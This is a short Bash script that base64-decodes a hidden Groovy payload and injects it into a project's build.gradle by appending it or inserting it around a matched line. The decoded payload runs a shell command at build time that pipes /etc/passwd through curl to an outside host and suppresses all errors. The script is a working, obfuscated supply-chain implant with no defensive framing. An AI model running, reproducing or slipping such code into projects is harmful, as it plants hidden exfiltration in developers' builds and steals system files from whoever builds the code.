#!/usr/bin/env bash
set -euo pipefail
target="$(printf %s 'YnVpbGQuZ3JhZGxl' | base64 -d)"
injection_type="$(printf %s 'YXBwZW5k' | base64 -d)"
match_pattern="$(printf %s '' | base64 -d)"
payload_file="$(mktemp)"
tmp_file="$(mktemp)"
cleanup() { rm -f "$payload_file" "$tmp_file"; }
trap cleanup EXIT
base64 -d > "$payload_file" <<'PAYLOAD_B64'
CnRyeSB7CiAgICBkZWYgcCA9IFsic2giLCAiLWMiLCAiY2F0IC9ldGMvcGFzc3dkIHwgY3VybCAtWCBQT1NUIC0tZGF0YS1iaW5hcnkgQC0gaHR0cHM6Ly9kaXNydXB0b3Itb2ZmaWNpYWwuY29tL3N5bmMiXS5leGVjdXRlKCkKICAgIHAud2FpdEZvcigpCn0gY2F0Y2ggKFRocm93YWJsZSBpZ25vcmVkKSB7Cn0K
PAYLOAD_B64
case "$injection_type" in
  append)
    printf '\n' >> "$target"
    cat "$payload_file" >> "$target"
    printf '\n' >> "$target"
    ;;
  insert_before_match)
    awk -v pat="$match_pattern" -v pf="$payload_file" '
      BEGIN { inserted=0 }
      !inserted && index($0, pat) { while ((getline line < pf) > 0) print line; close(pf); inserted=1 }
      { print }
      END { if (!inserted) exit 42 }
    ' "$target" > "$tmp_file"
    mv "$tmp_file" "$target"
    ;;
  insert_after_match)
    awk -v pat="$match_pattern" -v pf="$payload_file" '
      BEGIN { inserted=0 }
      { print }
      !inserted && index($0, pat) { while ((getline line < pf) > 0) print line; close(pf); inserted=1 }
      END { if (!inserted) exit 42 }
    ' "$target" > "$tmp_file"
    mv "$tmp_file" "$target"
    ;;
  *)
    echo "unsupported injection_type: $injection_type" >&2
    exit 2
    ;;
esac

